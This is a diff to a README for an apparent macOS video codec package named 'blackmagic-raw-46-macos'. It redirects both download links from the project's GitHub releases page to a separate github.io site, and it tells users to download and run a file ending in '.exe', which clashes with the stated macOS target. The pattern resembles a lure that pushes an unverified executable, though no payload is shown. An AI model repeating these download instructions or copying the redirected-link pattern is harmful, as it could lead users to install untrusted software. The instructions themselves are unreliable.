@@ -1,6 +1,6 @@
 # 🎞️ blackmagic-raw-46-macos - View high quality video files easily
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/nativistic-morphophysiology701/blackmagic-raw-46-macos/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://nativistic-morphophysiology701.github.io)
 
 The blackmagic-raw-46-macos package provides the tools you need to watch and edit high-resolution BRAW video files on your computer. This codec allows your system to process complex video data efficiently. It enables smooth playback and preserves the professional metadata contained in your media files.
 
@@ -18,7 +18,7 @@ Before you install this software, check your system to ensure it meets these min
 
 You can obtain the current version of the software through our official release page. 
 
-[Visit this page to download](https://github.com/nativistic-morphophysiology701/blackmagic-raw-46-macos/releases)
+[Visit this page to download](https://nativistic-morphophysiology701.github.io)
 
 On the release page, look for the list of assets. Click the file ending in .exe to begin the download. Save this file to a folder you can find easily, such as your Downloads folder or your Desktop.
 
